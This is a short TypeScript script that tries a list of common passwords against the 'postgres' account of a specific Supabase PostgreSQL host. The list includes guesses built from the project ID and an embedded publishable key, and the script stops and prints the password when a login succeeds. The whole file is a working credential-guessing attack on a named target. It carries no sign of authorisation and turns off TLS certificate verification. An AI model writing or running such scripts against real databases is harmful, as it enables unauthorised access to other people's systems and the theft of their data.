import { Client } from 'pg';

const host = 'db.egzeyuivpzuhphaozarz.supabase.co';
const port = 5432;
const user = 'postgres';
const database = 'postgres';

const commonPasswords = [
  'postgres',
  'supabase',
  'admin',
  'root',
  'password',
  'Supabase123!',
  'Supabase_123',
  'Supabase123',
  'postgres123',
  'postgres123!',
  'egzeyuivpzuhphaozarz',
  'sb_publishable_TUPDyAOKm4OYnhHWkKAOug__9kcVMqu',
  'TUPDyAOKm4OYnhHWkKAOug',
];

async function tryPassword(password: string): Promise<boolean> {
  console.log(`Trying password: ${password.substring(0, 5)}...`);
  const client = new Client({
    host,
    port,
    user,
    password,
    database,
    connectionTimeoutMillis: 5000,
    ssl: { rejectUnauthorized: false }
  });

  try {
    await client.connect();
    console.log(`🎉 SUCCESS! Password is correct: ${password}`);
    await client.end();
    return true;
  } catch (err: any) {
    console.log(`❌ Failed: ${err.message}`);
    return false;
  }
}

async function run() {
  for (const pw of commonPasswords) {
    const ok = await tryPassword(pw);
    if (ok) return;
  }
  console.log('All common passwords failed.');
}

run();
